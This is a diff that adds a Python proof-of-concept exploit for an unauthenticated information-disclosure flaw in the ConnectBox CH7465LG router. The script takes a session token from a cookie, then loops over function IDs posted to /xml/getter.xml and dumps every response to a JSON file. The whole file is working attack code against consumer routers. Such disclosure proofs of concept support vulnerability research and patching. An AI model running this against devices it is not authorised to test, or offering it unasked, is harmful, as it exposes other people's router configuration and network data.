@@ -1,0 +1,54 @@
+#!/usr/bin/env python3
+"""
+poc-information-dump.py: Unauthenticated Information Disclosure for the ConnectBox (CH7465LG).
+xitan - 2019 (https://xitan.me).
+"""
+import sys
+import requests
+import xmltodict
+import json
+
+START_NUMBER = 1
+END_NUMBER = 1000
+
+if len(sys.argv) < 2:
+    print("./poc-information-dump.py <router-ip>")
+    exit(1)
+
+session = requests.Session()
+
+index = session.get('http://' + sys.argv[1] + '/index.html')
+
+token = index.headers.get('Set-Cookie')[
+        index.headers.get('Set-Cookie').find('=') + 1:index.headers.get('Set-Cookie').find(';')]
+
+dump = list()
+
+for n in range(START_NUMBER, END_NUMBER):
+
+    getter_data = {
+        'token': token,
+        'fun': n
+    }
+
+    getter = session.post('http://' + sys.argv[1] + '/xml/getter.xml', data=getter_data)
+    token = getter.headers.get('Set-Cookie')[
+            getter.headers.get('Set-Cookie').find('=') + 1:getter.headers.get('Set-Cookie').find(';')]
+
+    print('[+] {}/{}: '.format(n, END_NUMBER), end='', flush=True)
+
+    try:
+        result = xmltodict.parse(getter.content)
+        dump.append(result)
+
+        print(dict(result))
+
+    except:
+        print('-')
+        pass
+
+with open('dump.json', 'a') as outfile:
+    json.dump(dump, outfile)
+
+
+print('[+] Dump completed.')
